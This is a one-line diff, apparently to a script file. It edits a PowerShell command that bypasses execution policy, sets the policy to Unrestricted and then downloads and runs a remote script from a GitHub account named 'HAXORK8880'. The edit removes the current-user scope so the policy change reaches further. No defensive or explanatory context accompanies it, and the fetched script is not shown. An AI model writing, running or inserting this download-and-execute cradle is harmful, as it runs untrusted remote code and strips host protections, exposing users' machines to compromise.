@@ -1,1 +1,1 @@
-start  powershell -nop  -noni -ep bypass -Command "Set-ExecutionPolicy Unrestricted  -Scope CurrentUser -Force; IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/HAXORK8880/recalls/main/Tr_445_recall.ps1');"
+start  powershell -nop  -noni -ep bypass -Command "Set-ExecutionPolicy Unrestricted   -Force; IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/HAXORK8880/recalls/main/Tr_445_recall.ps1');"
